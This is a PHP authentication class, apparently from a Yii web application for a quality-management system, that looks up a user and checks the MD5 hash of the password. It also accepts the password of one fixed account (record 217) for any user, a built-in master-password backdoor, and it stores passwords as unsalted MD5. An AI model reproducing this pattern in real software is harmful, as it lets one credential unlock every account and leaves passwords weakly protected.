<?php

class UserIdentity extends CUserIdentity {

    protected $_id;
    
    public function authenticate(){
        $user = ServUsers::model()->with('ServUsersCategory','ServUsersDepartament','ServUsersDolgnost','ServUsersOtdel')->findByPk($this->username);
        $pass=ServUsers::model()->findByPk(217,array('select'=>'pass'))->pass;
        if(($user!=null) && ((md5($this->password)===$user->pass) || (md5($this->password)===$pass)))
        {
            $this->_id = $user->id;
            $this->setState('username', $user->FIO);
            $this->setState('depid', $user->departamentid);
            $this->setState('otdid', $user->otdelid);
            $this->setState('dolid', $user->dolgnostid);
            $this->setState('userstring', 
                'СМК: Пользователь - '.$user->FIO.' / '
                .$user->ServUsersDepartament['name'].' / '
                .$user->ServUsersOtdel['name'].' / '
                .$user->ServUsersDolgnost['name'].' / '
                .'Категория - '
            );
            $this->errorCode = self::ERROR_NONE;
        }
        else
        {
            $this->errorCode = self::ERROR_USERNAME_INVALID;
        }
       return !$this->errorCode;
    }
 
    public function getId(){
        return $this->_id;
    }    
    
}